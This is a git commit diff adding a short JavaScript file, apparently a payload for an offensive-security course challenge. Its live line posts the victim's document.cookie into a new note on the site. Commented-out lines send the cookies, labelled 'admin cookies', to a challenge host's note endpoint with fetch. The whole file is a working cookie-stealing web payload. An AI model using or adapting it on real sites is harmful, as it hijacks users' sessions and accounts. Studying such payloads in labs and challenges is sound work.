13c62bcc3417c1ce2d06f8d84626a93f2e483e2c
comedian <machiavell.ian.means@protonmail.com>
2023-02-07 20:46:45 -0500

    move file

---
+++ test2.js
@@ -0,0 +1,12 @@
+$.post('/note/new',{title: document.cookie, content: document.cookie})
+        
+
+// const data = new FormData()
+// data.append("title", "admin cookies")
+// data.append("content", document.cookie)
+// data.append("submit", "save")
+// 
+// fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
+//   method: "POST",
+//   body: data,
+// })
